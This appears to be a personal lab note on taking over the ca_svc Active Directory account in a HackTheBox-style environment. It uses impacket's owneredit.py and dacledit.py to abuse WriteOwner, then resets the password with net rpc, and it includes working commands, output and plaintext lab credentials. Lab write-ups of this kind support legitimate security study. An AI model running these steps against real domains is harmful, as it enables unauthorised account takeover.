---
tags:
  - hack
---
# Using `impacket`

## Abusing `WriteOwner` with `owneredit.py`

Here I'm using impacket to abuse `WriteOwner` to take over the `ca_svc` account.

 First, I'll use `owneredit.py` to modify `OwnerSid` to the account I control:

```console
$ owneredit.py -action write -new-owner ryan -target ca_svc sequel/ryan:WqSZAF6CysDQbGb3 -dc-ip 10.10.11.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
(venv)
```

Then I can set `FullControl` rights:

```console
$ dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel/ryan:WqSZAF6CysDQbGb3 -dc-ip 10.10.11.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20250121-141410.bak
[*] DACL modified successfully!
(venv)
```

Now I can change the account's password, among other things:

```console
$ net rpc password ca_svc password123 -U sequel/ryan%WqSZAF6CysDQbGb3 -S sequel.htb
(venv)
```
